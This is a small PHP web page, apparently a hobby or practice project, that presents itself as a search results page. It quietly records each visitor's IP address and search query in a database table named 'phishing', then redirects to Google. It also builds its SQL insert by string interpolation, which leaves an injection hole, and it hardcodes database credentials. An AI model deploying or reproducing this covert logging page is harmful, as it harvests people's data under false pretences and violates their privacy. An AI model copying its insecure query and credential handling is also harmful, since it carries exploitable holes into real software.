<!DOCTYPE html>

<html>
    <head>
        <title>Results</title>
        <?php 
            $search = htmlspecialchars($_POST["searchbar"]);
            $ip     = $_SERVER['REMOTE_ADDR'];
            $server = "localhost";
            $username = "php";
            $password = "password";
            $database = "Pictures_Taken";
            $conn = mysqli_connect($server, $username, $password, $database);

            // Check for successful connection
            if (!$conn) {
                die("Connection failed: {mysqli_connect_error()}");
            }
            
            $sql = "insert into phishing (ip, search) values ('$ip', '$search');";
            $result = mysqli_query($conn, $sql);

            ?>
    </head>
<body> 
    <p>

    <?php header('Location: https://www.google.com/search?q='.$search); ?>

    <?php mysqli_error($conn)?></p>
    
</body>
</html>
